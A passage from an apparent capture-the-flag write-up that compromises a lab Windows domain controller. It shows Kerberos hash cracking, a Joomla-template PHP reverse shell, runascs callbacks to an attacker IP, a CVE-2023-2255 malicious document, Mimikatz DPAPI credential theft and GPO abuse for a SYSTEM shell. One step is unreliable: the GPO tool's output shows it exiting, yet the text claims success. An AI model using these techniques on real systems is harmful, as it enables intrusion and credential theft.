SMB         10.10.11.3      445    DC               [-] office\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
```
Log into the share using credentials. A `.pcap` file appears, download it.
```markdown
> smbclient \\\\office.htb\\'SOC Analysis' -U dwolfe%H0lOgrams4reTakIng0Ver754!

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed May 10 14:52:24 2023
  ..                                DHS        0  Wed Feb 14 05:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023

                6265599 blocks of size 4096. 1120672 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (223.6 KiloBytes/sec) (average 223.6 KiloBytes/sec)
smb: \> exit
```
Open the capture with Wireshark and filter by Kerberos protocol, turns out an `AS-REQ` packet has been captured.

![office Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b80aaab7-b48d-4b14-af71-7aef8df7b14b)

If you remember Kerberos theory, the user sends a timestamp encoded with the NTLM hash when a TGT is requested (`AS-REQ`) . In this case, Wireshark provides the encoded timestamp (`padata-value`) and the `cipher` used to encode it, this is the user's NTLM hash. Wireshark also indicates the timestamp has been encoded using AES-256.<br>
<br>
The cipher (i.e. the user NTLM hash) can be cracked it with `hashcat` (module 19900). For this, prepare the hash in a `hashcat` readable format according to https://hashcat.net/wiki/doku.php?id=example_hashes<br>
<br>
After crafting and testing a hash for any username previously disclosed, we find out the only crackable hash belongs to user `tstark`
```markdown
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```
Credential is cracked by `hashcat` module 19900.
```markdown
> hashcat -m 19900 -a 0 -d 1 hash.txt .\rockyou.txt
```
Which can be used to log into the Joomla (user administrator) login portal.

![office Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5a337467-063d-4e3d-9848-6819bad45441)

Once inside the dashboard, follow the same procedure as in the [HTB - Devvortex machine](https://github.com/g1vi/AllTheWriteUps/blob/main/Hack%20the%20box/Open%20beta%20season%20III%20(Fall%202023)/Week%209.%20HTB%20-%20Devvortex.MD). Navigate to `system -> site templates`, move to the `cassiopeia` template and overwrite the `error.php` file with a PHP reverse shell.<br>
<br>
In this case, we chose a `PHP Simon Sincek` reverse shell from http://www.revshells.com (`PHP PentestMonkey` did not work).

![office Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5d1c6f26-1722-4ab5-8cc0-91b0b00c117d)

Save and close, then trigger the reverse shell by navigating to http://office.htb/templates/cassiopeia/error.php<br>
<br>
A reverse shell is received on port 1919.
```markdown
C:\xampp\htdocs\joomla\templates\cassiopeia> whoami

office\web_account
```
This shell cannot be used to get the user flag, but since we have `tstark` credentials, we can just move laterally to this user with `runascs`
```markdown
c:\users\public\music> .\runascs.exe tstark <password here> cmd.exe -r 10.10.15.46:9999
```
A shell for user `tstark` is received on por 9999.
```markdown
> rlwrap -cAr nc -lvp 9999
listening on [any] 9999 ...
connect to [10.10.xxx.xxx] from office.htb [10.10.11.3] 64331

Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

office\tstark
```
Which can be used to retrieve the user flag.

### SYSTEM
Start from the `tstark` shell, and take the opportunity to enumerate the system.
```markdown
C:\Windows\system32> systeminfo

Host Name:                 DC
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
System Type:               x64-based PC
```
Find the file `c:\xampp\htdocs\internal\resume.php` and enumerate the source code. It seems it is an internal service allowing the employees to upload their resumes in `.doc`, `.docx`, `.docm` or `.odt` format (which explains the box's name).<br>
<br>
Looking for ways to to generate a malicious `.odt` files, we come across this POC https://github.com/elweth-sec/CVE-2023-2255<br>
<br>
Prepare a `shell.exe` payload with `msfvenom`, then transfer it to the folder `c:\users\public\music` in the victim.<br>
<br>
Now use the POC to create a malicious `.odt`
```markdown
> python3 CVE-2023-2255.py --cmd 'c:\users\public\music\shell.exe' --output 'present.odt' 
File present.odt has been created !
```
Start a listener and copy the file `present.odt` into `c:\xampp\htdocs\internal\applications`, which is the folder where the uploaded resumes land.<br>
<br>
Note: for this I used the `web_account` shell, since the user `tshark` does not have write permissions in the `applications` folder. Alternatively, you can forward internal port to Kali and copy the file using the resume upload application.<br>
<br>
Wait a while until someone opens the file. Shortly after a reverse shell is received on the listener for user `ppotts`
```markdown
> rlwrap -cAr nc -lvp 9001
listening on [any] 9001 ...
connect to [10.10.xxx.xxx] from office.htb [10.10.11.3] 62704

Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

> whoami
office\ppotts
```
Enumerate stored credentials.
```markdown
> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=OFFICE\hhogan
    Type: Domain Password
    User: OFFICE\hhogan
```
It seems credential for user `hhogan` is stored in the vault; however, you will not be able to use it with `runas` since it is protected by DPAPI.<br>
<br>
Before trying to decrypt the DPAPI secret, read this:<br>
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials<br>
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials<br>
<br>
Now that we understand what is happening, let's follow GentilKiwi's procedure. First, look for the Windows credential files in the file system.
```markdown
> dir /a %appdata%\Microsoft\Credentials

 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

02/19/2024  03:26 PM    <DIR>          .
01/18/2024  09:34 AM    <DIR>          ..
05/09/2023  01:08 PM               358 18A1927A997A794B65E9849883AC3F3E
05/09/2023  03:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
02/19/2024  03:22 PM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
02/19/2024  03:26 PM               374 FCC3ECA2B60DDA9204044C22EEC7CC48
               4 File(s)          1,504 bytes
               2 Dir(s)   4,610,813,952 bytes free
```
And the masterkey files.
```markdown
> dir /a %appdata%\microsoft\protect

 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of c:\users\ppotts\appdata\roaming\microsoft\protect

05/04/2023  09:58 AM    <DIR>          .
01/18/2024  09:34 AM    <DIR>          ..
05/02/2023  03:13 PM                24 CREDHIST
01/17/2024  03:43 PM    <DIR>          S-1-5-21-1199398058-4196589450-691661856-1107
01/17/2024  04:06 PM                76 SYNCHIST
               2 File(s)            100 bytes
               3 Dir(s)   3,185,594,368 bytes free

> dir /a c:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107

 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of c:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107

01/17/2024  03:43 PM    <DIR>          .
05/04/2023  09:58 AM    <DIR>          ..
01/17/2024  03:43 PM               740 10811601-0fa9-43c2-97e5-9bef8471fc7d
05/02/2023  03:13 PM               740 191d3f9d-7959-4b4d-a520-a444853c47eb
05/02/2023  03:13 PM               900 BK-OFFICE
01/17/2024  03:43 PM                24 Preferred
               4 File(s)          2,404 bytes
               2 Dir(s)   3,184,939,008 bytes free
```
Transfer a copy of Mimikatz to the host and enumerate the credentials files. We will focus on this file in particular.
```markdown
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

dpapi::cred /in:%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
```
We see this file uses the masterkey GUID `{191d3f9d-7959-4b4d-a520-a444853c47eb}`, so let's decrypt this masterkey with Mimikatz.
```markdown
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

dpapi::masterkey /in:c:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

[...]

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```
Now that we have the key, we can decrpt the credentials file and get `hhogan` password.
```markdown
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

dpapi::cred /in:%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : <password here>
  Attributes     : 0
```
Use these credentials to log in with `evil-winrm`
```markdown
> evil-winrm -u hhogan -p <password here> -i dc.office.htb
```
Enumerate the domain.
```markdown
> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=office,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=office,DC=htb
DistinguishedName                  : DC=office,DC=htb
DNSRoot                            : office.htb
DomainControllersContainer         : OU=Domain Controllers,DC=office,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1199398058-4196589450-691661856
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=office,DC=htb
Forest                             : office.htb
InfrastructureMaster               : DC.office.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=office,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=office,DC=htb
ManagedBy                          :
Name                               : office
NetBIOSName                        : OFFICE
ObjectClass                        : domainDNS
ObjectGUID                         : b93712c7-b7a5-449e-b050-3e85e60db699
ParentDomain                       :
PDCEmulator                        : DC.office.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=office,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC.office.htb}
RIDMaster                          : DC.office.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=office,DC=htb, DC=DomainDnsZones,DC=office,DC=htb, CN=Configuration,DC=office,DC=htb}
SystemsContainer                   : CN=System,DC=office,DC=htb
UsersContainer                     : CN=Users,DC=office,DC=htb
```
Enumerate the user `hhogan`, pay attention to group memberships.
```markdown
> whoami
office\hhogan

> net user hhogan
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 10:59:34 AM
Password expires             Never
Password changeable          5/7/2023 10:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 4:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```
So the user is member of a group called `GPO Managers`, which suggests he may be able to write GPOs.<br>
<br>
Enumerate all the domain GPOs.
```markdown
> Get-GPO -All

DisplayName      : Windows Firewall GPO
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 04fe5c75-0078-4d44-97c5-8a796be906ec
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:47:27 AM
ModificationTime : 5/10/2023 8:47:26 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

DisplayName      : Default Domain Policy
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 4/14/2023 3:13:57 PM
ModificationTime : 5/10/2023 9:30:06 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 18, SysVol Version: 18
WmiFilter        :

DisplayName      : Default Active Directory Settings GPO
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 37238285-35d0-4d0c-a702-b489c38ed505
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:45:44 AM
ModificationTime : 5/10/2023 8:45:44 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

DisplayName      : Default Domain Controllers Policy
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 4/14/2023 3:13:57 PM
ModificationTime : 1/25/2024 2:40:02 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 12, SysVol Version: 12
WmiFilter        :

DisplayName      : Windows Update GPO
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 7b6165c4-c41d-47ed-9a37-e1a058f230c1
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:47:13 AM
ModificationTime : 5/10/2023 8:47:14 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

DisplayName      : Windows Update Domain Policy
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 86e68a9a-f5e9-49b9-a1e3-9ccdaa9251b4
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:58:24 AM
ModificationTime : 5/10/2023 9:28:36 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 3, SysVol Version: 0
WmiFilter        :

DisplayName      : Software Installation GPO
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : 9d183bb5-7581-4c19-9390-b1ebccacce99
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:47:05 AM
ModificationTime : 5/10/2023 8:47:04 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

DisplayName      : Password Policy GPO
DomainName       : office.htb
Owner            : OFFICE\Domain Admins
Id               : ec1feba4-db03-4721-81db-b0baa61ffa18
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 5/10/2023 9:46:49 AM
ModificationTime : 5/10/2023 8:46:48 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```
Notice the `Default Domain Controllers Policy` GPO and take note of its `Id: 6AC1786C-016F-11D2-945F-00C04fB984F9`.<br>
<br>
Upload a copy of PowerView (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and continue enumerating, for example, the `GPO Managers` group.
```markdown
> Get-NetGroup -name *GPO*

usncreated            : 57690
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : GPO Managers
whenchanged           : 5/10/2023 4:48:34 PM
objectsid             : S-1-5-21-1199398058-4196589450-691661856-1117
objectclass           : {top, group}
cn                    : GPO Managers
usnchanged            : 57694
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : GPO Managers
distinguishedname     : CN=GPO Managers,CN=Users,DC=office,DC=htb
member                : CN=HHogan,CN=Users,DC=office,DC=htb
whencreated           : 5/10/2023 4:48:23 PM
instancetype          : 4
objectguid            : ab92e389-387b-4346-94e5-84b3e3c27ac5
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=office,DC=htb
```
Take note of the `ojectsid: S-1-5-21-1199398058-4196589450-691661856-1117` and move forward.
Next step is to enumerate all the permissions for all GPO in the current domain with PowerView.
```markdown
> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
The ouput is very large but, if you analyze it carefully, you'll see group `GPO Managers` (`S-1-5-21-1199398058-4196589450-691661856-1117`) have write permissions on the `Default Domain Controllers Policy` (`6AC1786C-016F-11D2-945F-00C04fB984F9`).
```markdown
[…]
AceType               : AccessAllowed
ObjectDN              : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}, CN=Policies, CN=System, DC=office, DC=htb
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1199398058-4196589450-691661856-1117
AccessMask            : 131127
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
[…]
```
To exploit this misconfiguration we will use a tool called SharpGPOAbuse (https://github.com/byronkg/SharpGPOAbuse), so we can modify the GPO and execute any command as administrator. A list of the tool capabilities is available here: https://github.com/FSecureLABS/SharpGPOAbuse.

In this case, we will abuse the GPO to send a base-64 encoded reverse shell under the administrator context. 
```markdown
> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author OFFICE\Administrator --Command "cmd.exe" --Arguments "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOA[...]" --GPOName "Default Domain Controllers Policy"

[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] GUID of "Default Domain Controllers Policy" is: {6AC1786C-016F-11D2-945F-00C04fB984F9}
[!] The GPO already includes a ScheduledTasks.xml. Use --Force to append to ScheduledTasks.xml or choose another GPO.
[-] Exiting...
```
The task is added as a new immediate tasks, to force execution just update the GPO policy.
```markdown
> gpupdate /force

Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```
A system reverse shell is received on the listener.

![office Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4695d05d-b3f6-46a5-bf43-982624a8b2b7)

You are root.

